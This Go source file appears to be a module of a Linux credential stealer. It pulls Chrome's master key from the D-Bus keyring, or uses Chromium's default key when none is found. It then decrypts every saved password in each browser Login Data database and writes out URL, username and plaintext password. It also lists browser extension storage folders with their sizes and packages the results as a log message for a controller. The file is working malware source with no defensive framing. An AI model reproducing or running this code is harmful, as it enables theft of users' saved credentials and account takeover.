//go:build linux
// +build linux

package auto

import (
	"bits-project/bits/config"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"time"
	"crypto/hmac"
	"strings"
	"strconv"
	"hash"
	"crypto/sha1"
	"github.com/godbus/dbus/v5"
	keyring "github.com/ppacher/go-dbus-keyring"
	_ "modernc.org/sqlite"
)

type ChromiumPassword []loginData

type loginData struct {
	UserName    string
	encryptPass []byte
	encryptUser []byte
	Password    string
	LoginURL    string
	CreateDate  time.Time
}

const (
	queryChromiumLogin = `SELECT origin_url, username_value, password_value, date_created FROM logins`
)

// TempFilename returns the temp filename for the item with suffix
// eg: chromiumKey_0.temp
func TempFilename() string {
	const tempSuffix = "temp"
	tempFile := fmt.Sprintf("%s_%d.%s", "Login Data", 1, tempSuffix)
	return filepath.Join(os.TempDir(), tempFile)
}

func TimeStamp(stamp int64) time.Time {
	s := time.Unix(stamp, 0)
	if s.Local().Year() > 9999 {
		return time.Date(9999, 12, 13, 23, 59, 59, 0, time.Local)
	}
	return s
}

func TimeEpoch(epoch int64) time.Time {
	maxTime := int64(99633311740000000)
	if epoch > maxTime {
		return time.Date(2049, 1, 1, 1, 1, 1, 1, time.Local)
	}
	t := time.Date(1601, 1, 1, 0, 0, 0, 0, time.Local)
	d := time.Duration(epoch)
	for i := 0; i < 1000; i++ {
		t = t.Add(d)
	}
	return t
}


func paddingZero(src []byte, length int) []byte {
	padding := length - len(src)
	if padding <= 0 {
		return src
	}
	return append(src, make([]byte, padding)...)
}

func pkcs5UnPadding(src []byte) ([]byte, error) {
	length := len(src)
	if length == 0 {
		return nil, errors.New("pkcs5UnPadding: src should not be empty")
	}
	padding := int(src[length-1])
	if padding < 1 || padding > aes.BlockSize {
		return nil, errors.New("pkcs5UnPadding: invalid padding size")
	}
	return src[:length-padding], nil
}

func pkcs5Padding(src []byte, blocksize int) []byte {
	padding := blocksize - (len(src) % blocksize)
	padText := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(src, padText...)
}

func AES128CBCDecrypt(key, iv, ciphertext []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	// Check ciphertext length
	if len(ciphertext) < aes.BlockSize {
		return nil, errors.New("AES128CBCDecrypt: ciphertext too short")
	}
	if len(ciphertext)%aes.BlockSize != 0 {
		return nil, errors.New("AES128CBCDecrypt: ciphertext is not a multiple of the block size")
	}

	decryptedData := make([]byte, len(ciphertext))
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(decryptedData, ciphertext)

	// unpad the decrypted data and handle potential padding errors
	decryptedData, err = pkcs5UnPadding(decryptedData)
	if err != nil {
		return nil, fmt.Errorf("AES128CBCDecrypt: %w", err)
	}

	return decryptedData, nil
}

var ErrCiphertextLengthIsInvalid = errors.New("ciphertext length is invalid")

func DecryptWithChromium(key, encryptPass []byte) ([]byte, error) {
	if len(encryptPass) < 3 {
		return nil, ErrCiphertextLengthIsInvalid
	}
	iv := []byte{32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32}
	return AES128CBCDecrypt(key, iv, encryptPass[3:])
}

func DecryptWithDPAPI(_ []byte) ([]byte, error) {
	return nil, nil
}

func GetMasterKey() ([]byte, error) {
	conn, err := dbus.SessionBus()
	if err != nil {
		return nil, err
	}
	svc, err := keyring.GetSecretService(conn)
	if err != nil {
		return nil, err
	}
	session, err := svc.OpenSession()
	if err != nil {
		return nil, err
	}
	defer func() {
		if err := session.Close(); err != nil {
			fmt.Printf("close dbus session error: %v", err)
		}
	}()
	collections, err := svc.GetAllCollections()
	if err != nil {
		return nil, err
	}
	var secret []byte
	for _, col := range collections {
		items, err := col.GetAllItems()
		if err != nil {
			return nil, err
		}
		for _, i := range items {
			label, err := i.GetLabel()
			if err != nil {
				print(err)
				continue
			}
			if label == "Chrome Safe Storage" {
				se, err := i.GetSecret(session.Path())
				if err != nil {
					return nil, fmt.Errorf("get storage from dbus: %w", err)
				}
				secret = se.Value
			}
		}
	}

	if len(secret) == 0 {
		// set default secret @https://source.chromium.org/chromium/chromium/src/+/main:components/os_crypt/os_crypt_linux.cc;l=100
		secret = []byte("peanuts")
	}
	salt := []byte("saltysalt")
	// @https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_linux.cc
	key := PBKDF2Key(secret, salt, 1, 16, sha1.New)

	return key, nil
}

func PBKDF2Key(password, salt []byte, iter, keyLen int, h func() hash.Hash) []byte {
	prf := hmac.New(h, password)
	hashLen := prf.Size()
	numBlocks := (keyLen + hashLen - 1) / hashLen

	var buf [4]byte
	dk := make([]byte, 0, numBlocks*hashLen)
	u := make([]byte, hashLen)
	for block := 1; block <= numBlocks; block++ {
		// N.B.: || means concatenation, ^ means XOR
		// for each block T_i = U_1 ^ U_2 ^ ... ^ U_iter
		// U_1 = PRF(password, salt || uint(i))
		prf.Reset()
		prf.Write(salt)
		buf[0] = byte(block >> 24)
		buf[1] = byte(block >> 16)
		buf[2] = byte(block >> 8)
		buf[3] = byte(block)
		prf.Write(buf[:4])
		dk = prf.Sum(dk)
		t := dk[len(dk)-hashLen:]
		copy(u, t)

		for n := 2; n <= iter; n++ {
			prf.Reset()
			prf.Write(u)
			u = u[:0]
			u = prf.Sum(u)
			for x := range u {
				t[x] ^= u[x]
			}
		}
	}
	return dk[:keyLen]
}

func getDirectorySize(path string) (int64, error) {
	var totalSize int64
	err := filepath.WalkDir(path, func(_ string, d os.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if !d.IsDir() {
			info, err := d.Info()
			if err != nil {
				return err
			}
			totalSize += info.Size()
		}
		return nil
	})
	return totalSize, err
}

// listSubdirectories lists all subdirectories and their sizes.
func listSubdirectories(buff *bytes.Buffer, root string, origin string) error {
	fmt.Printf("%s\n", root)
	fmt.Fprintf(buff, "%s\n", root)

	err := filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if d.IsDir() && (len(path) == (len(origin) + 33)) {
			size, err := getDirectorySize(path)

			var (name string)
			if len(path) > 32 {
				name = path[len(path)-32:]
			} else {
				// If the string is shorter than 32 characters, you can use the entire string
				name = path
			}

			if err != nil {
				fmt.Printf("   Failed to calculate size for %s: %v\n", name, err)
				fmt.Fprintf(buff, "   Failed to calculate size for %s: %v\n", name, err)
				return nil
			}

			formattedSize := fmt.Sprintf("%s", strconv.FormatInt(int64(size), 10))

			fmt.Printf("   Extension: %s, Size: %s bytes\n", name, formattedSize)
			fmt.Fprintf(buff, "   Extension: %s, Size: %s bytes\n", name, formattedSize)
		}

		return nil
	})
	return err
}

func processLoginData(masterKey []byte, path string, buf *bytes.Buffer) error {
	db, err := sql.Open("sqlite", path)
	if err != nil {
		return err
	}
	defer db.Close()

	rows, err := db.Query(queryChromiumLogin)

	if err != nil {
		return err
	}
	defer rows.Close()

	for rows.Next() {
		var (
			url, username string
			pwd, password []byte
			create        int64
		)
		if err := rows.Scan(&url, &username, &pwd, &create); err != nil {
			fmt.Printf("scan chromium password error: %v", err)
		}

		if len(pwd) > 0 {
			password, err = DecryptWithChromium(masterKey, pwd)
			fmt.Fprintln(buf, url, " | ", username, " | ", string(password))

			if err != nil {
				fmt.Fprintln(buf, "decrypt chromium password error: %v", err)
			}
		}
	}

	return nil
}

func AutoModeChromeCookie() (string, [][]byte) {
	print("============ AutoModeChromeCookie-Linux ============\n")

	var (
		buf          bytes.Buffer
		userdata_dir string
	)

	userdata_dir = getUserdataDir()
	masterKey, err := GetMasterKey()
	if err != nil {
		msg_type := config.MSG_FILE
		return msg_type, nil
	}

	// file system search
	_ = filepath.Walk(userdata_dir, func(path string, info os.FileInfo, err error) error {
		if info.Name() == logins_data_file {
			fmt.Fprintf(&buf, "==== %s ====\n", path)
			processLoginData(masterKey, path, &buf)
		}
		return nil
	})

	_ = filepath.Walk(userdata_dir, func(path string, info os.FileInfo, err error) error {
		if (strings.Contains(path, "Local Extension Settings")) {
			if (path[len(path) - 24:] == "Local Extension Settings") {
				// List Extensions
				if err := listSubdirectories(&buf, path, path); err != nil {
					fmt.Fprintf(&buf, "AutoModeChromeCookie Error: %v\n", err)
				}
			}	
		}
		return nil
	})

	print("============ End ============\n")

	// return
	data := make([][]byte, 3)
	data[0] = []byte(config.LOG_SUCCESS)
	data[1] = buf.Bytes()
	msg_type := config.MSG_LOG

	return msg_type, data
}

func AutoModeMacChromeLoginData() (string, [][]byte) {	
	msg_type := config.MSG_FILE

	return msg_type, nil

}